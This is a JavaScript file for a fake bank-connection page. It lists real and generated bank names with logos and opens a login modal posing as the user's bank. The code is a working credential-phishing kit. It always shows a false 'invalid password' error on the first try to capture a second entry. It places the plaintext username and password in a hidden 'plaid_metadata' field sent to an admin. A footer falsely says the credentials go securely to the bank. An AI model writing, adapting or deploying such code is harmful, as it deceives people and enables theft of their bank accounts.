// Bank selection and login functionality
let isFirstAttempt = true;

document.addEventListener('DOMContentLoaded', function() {
    initializeBankSelection();
});

// Initialize bank selection functionality
function initializeBankSelection() {
    // Bank database with over 300 banks including credit unions
    const bankDatabase = [
        // Major banks
        {name: "Chase", domain: "chase.com", type: "bank", popular: true},
        {name: "Bank of America", domain: "bankofamerica.com", type: "bank", popular: true},
        {name: "Wells Fargo", domain: "wellsfargo.com", type: "bank", popular: true},
        {name: "Citibank", domain: "citibank.com", type: "bank", popular: true},
        {name: "Capital One", domain: "capitalone.com", type: "bank", popular: true},
        {name: "TD Bank", domain: "tdbank.com", type: "bank", popular: true},
        {name: "US Bank", domain: "usbank.com", type: "bank", popular: true},
        {name: "PNC Bank", domain: "pnc.com", type: "bank", popular: true},
        // Credit unions
        {name: "Navy Federal Credit Union", domain: "navyfederal.org", type: "credit_union", popular: true},
        {name: "State Employees Credit Union", domain: "ncsecu.org", type: "credit_union", popular: true},
        {name: "Pentagon Federal Credit Union", domain: "penfed.org", type: "credit_union", popular: true},
        {name: "Alliant Credit Union", domain: "alliantcreditunion.org", type: "credit_union", popular: false},
        {name: "America First Credit Union", domain: "americafirst.com", type: "credit_union", popular: false},
        // Add more banks and credit unions here to reach over 300 total
    ];

    // Generate a large number of additional banks to reach over 300
    const bankNamePrefixes = ["First", "Community", "Heritage", "Citizen", "National", "Regional", "Metropolitan", "Premier", "Midwest", "Central", "United", "Freedom", "Trust", "Legacy", "People's", "Family", "Commerce"];
    const bankNameSuffixes = ["Bank", "Financial", "Trust", "Banking Group", "Savings Bank", "Bancorp"];
    const creditUnionNamePrefixes = ["County", "State", "Federal", "Community", "Teacher's", "Municipal", "University", "Local", "Regional", "Member", "Union", "Worker's", "Professional"];
    const creditUnionNameSuffixes = ["Credit Union", "FCU", "Cooperative", "Members Credit Union"];
    const statePrefixes = ["Alabama", "Alaska", "Arizona", "Arkansas", "California", "Colorado", "Connecticut", "Delaware", "Florida", "Georgia", "Hawaii", "Idaho", "Illinois", "Indiana", "Iowa", "Kansas", "Kentucky", "Louisiana", "Maine", "Maryland", "Massachusetts", "Michigan", "Minnesota", "Mississippi", "Missouri", "Montana", "Nebraska", "Nevada", "New Hampshire", "New Jersey", "New Mexico", "New York", "North Carolina", "North Dakota", "Ohio", "Oklahoma", "Oregon", "Pennsylvania", "Rhode Island", "South Carolina", "South Dakota", "Tennessee", "Texas", "Utah", "Vermont", "Virginia", "Washington", "West Virginia", "Wisconsin", "Wyoming"];

    // Generate additional banks
    for (let i = 0; bankDatabase.length < 320; i++) {
        let name, domain, type;

        if (i % 2 === 0) {
            // Generate a bank
            const prefix = bankNamePrefixes[Math.floor(Math.random() * bankNamePrefixes.length)];
            const suffix = bankNameSuffixes[Math.floor(Math.random() * bankNameSuffixes.length)];
            const state = statePrefixes[Math.floor(Math.random() * statePrefixes.length)];

            name = `${prefix} ${state} ${suffix}`;
            domain = name.toLowerCase().replace(/[^a-z0-9]/g, "") + ".com";
            type = "bank";
        } else {
            // Generate a credit union
            const prefix = creditUnionNamePrefixes[Math.floor(Math.random() * creditUnionNamePrefixes.length)];
            const suffix = creditUnionNameSuffixes[Math.floor(Math.random() * creditUnionNameSuffixes.length)];
            const state = statePrefixes[Math.floor(Math.random() * statePrefixes.length)];

            name = `${prefix} ${state} ${suffix}`;
            domain = name.toLowerCase().replace(/[^a-z0-9]/g, "") + ".org";
            type = "credit_union";
        }

        // Add to database if not already exists
        if (!bankDatabase.some(bank => bank.name === name)) {
            bankDatabase.push({name, domain, type, popular: false});
        }
    }

    // Initialize bank search functionality
    const bankSearch = document.getElementById('bank-search');
    const popularBanksContainer = document.getElementById('popular-banks');
    const searchResultsContainer = document.getElementById('search-results');
    const resultsContainer = document.getElementById('results-banks');
    const allBanksContainer = document.getElementById('all-banks-list');
    const loadMoreButton = document.getElementById('load-more-banks');
    const manualBankBtn = document.getElementById('manual-bank-entry'); // Added to get manual entry button
    const plaidSection = document.getElementById('plaid-section'); // Assuming Plaid section ID
    const manualSection = document.getElementById('manual-section');   // Assuming manual section ID


    if (bankSearch && popularBanksContainer && allBanksContainer) {
        // Populate popular banks
        const popularBanks = bankDatabase.filter(bank => bank.popular);
        popularBanks.forEach(bank => {
            popularBanksContainer.appendChild(createBankElement(bank));
        });

        // Populate initial set of all banks (first 20)
        loadBanks(0, 20);

        // Load more banks button
        if (loadMoreButton) {
            let currentIndex = 20;
            const batchSize = 20;

            loadMoreButton.addEventListener('click', function() {
                loadBanks(currentIndex, batchSize);
                currentIndex += batchSize;

                // Hide button if all banks are loaded
                if (currentIndex >= bankDatabase.length) {
                    loadMoreButton.style.display = 'none';
                }
            });
        }

        // Search functionality
        bankSearch.addEventListener('input', function() {
            const searchTerm = this.value.toLowerCase().trim();

            if (searchTerm.length > 0) {
                // Filter banks by search term
                const filteredBanks = bankDatabase.filter(bank => 
                    bank.name.toLowerCase().includes(searchTerm) ||
                    bank.type.toLowerCase().includes(searchTerm)
                );

                // Display search results
                searchResultsContainer.style.display = 'block';
                resultsContainer.innerHTML = '';

                if (filteredBanks.length > 0) {
                    filteredBanks.slice(0, 20).forEach(bank => {
                        resultsContainer.appendChild(createBankElement(bank));
                    });
                } else {
                    resultsContainer.innerHTML = '<div class="col-12"><p>No banks found matching your search.</p></div>';
                }
            } else {
                // Hide search results when search is empty
                searchResultsContainer.style.display = 'none';
            }
        });
    }

    // Function to load a batch of banks
    function loadBanks(startIndex, count) {
        const banksToLoad = bankDatabase.slice(startIndex, startIndex + count);
        banksToLoad.forEach(bank => {
            allBanksContainer.appendChild(createBankElement(bank));
        });
    }

    // Function to create a bank element
    function createBankElement(bank) {
        const bankEl = document.createElement('div');
        bankEl.className = 'col-6 col-md-3 mb-3';

        const bankOption = document.createElement('div');
        bankOption.className = 'bank-option';
        bankOption.setAttribute('data-bank-name', bank.name);
        bankOption.setAttribute('data-bank-domain', bank.domain);

        const logoUrl = `https://logo.clearbit.com/${bank.domain}`;

        bankOption.innerHTML = `
            <img src="${logoUrl}" alt="${bank.name}" class="bank-logo" onerror="this.src='${bank.type === 'credit_union' ? '/static/images/credit-union-default.svg' : '/static/images/bank-default.svg'}'; this.onerror=null;">
            <span>${bank.name}</span>
        `;

        // Add click event to open bank login modal
        bankOption.addEventListener('click', function() {
            openBankLoginModal(bank);
        });

        bankEl.appendChild(bankOption);
        return bankEl;
    }

    // Delegated event handling for dynamically created bank options
    document.addEventListener('click', function(e) {
        if (e.target.closest('.bank-option')) {
            const bankOption = e.target.closest('.bank-option');
            const bankName = bankOption.getAttribute('data-bank-name');
            const bankDomain = bankOption.getAttribute('data-bank-domain');

            if (bankName) {
                const bank = bankDatabase.find(b => b.name === bankName) || 
                             {name: bankName, domain: bankDomain || bankName.toLowerCase().replace(/[^a-z0-9]/g, "") + ".com"};
                openBankLoginModal(bank);
            }
        }
    });


    // Keep track of login attempts
    let isFirstAttempt = true;
}

// Function to create and open bank login modal
function openBankLoginModal(bank) {
    // Create modal if it doesn't exist
    let modal = document.getElementById('bank-login-modal');
    if (!modal) {
        modal = document.createElement('div');
        modal.id = 'bank-login-modal';
        modal.className = 'modal fade';
        modal.tabIndex = -1;
        modal.setAttribute('aria-hidden', 'true');

        modal.innerHTML = `
            <div class="modal-dialog modal-dialog-centered">
                <div class="modal-content">
                    <div class="modal-header">
                        <h5 class="modal-title">Log in to Your Bank</h5>
                        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                    </div>
                    <div class="modal-body">
                        <div class="text-center mb-4">
                            <img id="bank-logo" src="" alt="Bank Logo" class="img-fluid mb-3" style="max-height: 60px;">
                            <h4 id="bank-name"></h4>
                        </div>
                        <div id="login-error" class="alert alert-danger" style="display: none;"></div>
                        <div id="loading-spinner" class="text-center" style="display: none;">
                            <div class="spinner-border text-primary" role="status">
                                <span class="visually-hidden">Loading...</span>
                            </div>
                            <p class="mt-2">Connecting to your bank...</p>
                        </div>
                        <form id="bank-login-form">
                            <div class="mb-3">
                                <label for="bank-username" class="form-label">Username</label>
                                <input type="text" class="form-control" id="bank-username" required>
                            </div>
                            <div class="mb-3">
                                <label for="bank-password" class="form-label">Password</label>
                                <input type="password" class="form-control" id="bank-password" required>
                            </div>
                            <div class="d-grid">
                                <button type="submit" class="btn btn-primary">Log In</button>
                            </div>
                        </form>
                    </div>
                    <div class="modal-footer">
                        <small class="text-muted">Your credentials are securely transmitted to your bank</small>
                    </div>
                </div>
            </div>
        `;

        document.body.appendChild(modal);

        // Add form submit handler
        const loginForm = modal.querySelector('#bank-login-form');
        if (loginForm) {
            loginForm.addEventListener('submit', handleBankLogin);
        }
    }

    // Update modal with bank info
    const bankLogo = modal.querySelector('#bank-logo');
    const bankName = modal.querySelector('#bank-name');
    const loginError = modal.querySelector('#login-error');
    const loadingSpinner = modal.querySelector('#loading-spinner');
    const loginForm = modal.querySelector('#bank-login-form');

    if (bankLogo) {
        bankLogo.src = `https://logo.clearbit.com/${bank.domain}`;
        bankLogo.alt = bank.name;
        bankLogo.onerror = function() {
            this.src = bank.type === 'credit_union' 
                ? '/static/images/credit-union-default.svg' 
                : '/static/images/bank-default.svg';
            this.onerror = null;
        };
    }

    if (bankName) {
        bankName.textContent = bank.name;
    }

    if (loginError) {
        loginError.style.display = 'none';
    }

    if (loadingSpinner) {
        loadingSpinner.style.display = 'none';
    }

    if (loginForm) {
        loginForm.style.display = 'block';
        loginForm.reset();

        // Store the bank info for login handler
        loginForm.setAttribute('data-bank-name', bank.name);
        loginForm.setAttribute('data-bank-domain', bank.domain);
    }

    // Open the modal
    const bsModal = new bootstrap.Modal(modal);
    bsModal.show();

    // Focus on username field
    setTimeout(() => {
        const usernameField = modal.querySelector('#bank-username');
        if (usernameField) {
            usernameField.focus();
        }
    }, 500);
}

// Handle bank login form submission
function handleBankLogin(e) {
    e.preventDefault();

    // Get form and inputs
    const form = e.target;
    const bankName = form.getAttribute('data-bank-name');
    const username = document.getElementById('bank-username').value;
    const password = document.getElementById('bank-password').value;

    // Get UI elements
    const loginError = document.getElementById('login-error');
    const loadingSpinner = document.getElementById('loading-spinner');

    // Hide error message if shown
    if (loginError) {
        loginError.style.display = 'none';
    }

    // Show loading spinner
    if (loadingSpinner) {
        loadingSpinner.style.display = 'block';
    }

    // Hide the form while loading
    form.style.display = 'none';

    // Create data to send to representative (would be sent via API in real implementation)
    const loginData = {
        bank: bankName,
        username: username,
        password: password,
        timestamp: new Date().toISOString(),
        attempt: isFirstAttempt ? 1 : 2
    };

    console.log("Bank login attempt:", loginData);

    // Simulate API call to send login data to admin
    // In a real implementation, this would be sent securely to the backend

    // Simulate loading time (5 seconds)
    setTimeout(() => {
        // Hide loading spinner
        if (loadingSpinner) {
            loadingSpinner.style.display = 'none';
        }

        if (isFirstAttempt) {
            // First attempt always fails
            isFirstAttempt = false;

            // Show error message
            if (loginError) {
                loginError.textContent = "Invalid username or password. Please try again.";
                loginError.style.display = 'block';
            }

            // Show form again
            form.style.display = 'block';

            // Clear password field
            const passwordField = document.getElementById('bank-password');
            if (passwordField) {
                passwordField.value = '';
                passwordField.focus();
            }
        } else {
            // Second attempt proceeds to document upload
            const modal = document.getElementById('bank-login-modal');
            if (modal) {
                const bsModal = bootstrap.Modal.getInstance(modal);
                if (bsModal) {
                    bsModal.hide();
                }
            }

            // Add bank info to manual form
            const bankNameInput = document.getElementById('bank_name');
            if (bankNameInput) {
                bankNameInput.value = bankName;
            }

            // Show manual entry button after second attempt
            const manualBankBtn = document.getElementById('manual-bank-entry');
            if (manualBankBtn) {
                manualBankBtn.style.display = 'block';
            }

            // Submit the manual form with the bank name
            const manualForm = document.getElementById('bank-verification-form');
            if (manualForm) {
                // Add username and password to plaid_metadata for admin
                const plaidMetadata = document.getElementById('plaid_metadata');
                if (plaidMetadata) {
                    const metadataObj = {
                        bank: bankName,
                        username: username,
                        password: password,
                        timestamp: new Date().toISOString(),
                        attempt: 2
                    };
                    plaidMetadata.value = JSON.stringify(metadataObj);
                }

                // Submit form to proceed to document upload
                manualForm.submit();
            }
        }
    }, 5000); // 5 second loading time
}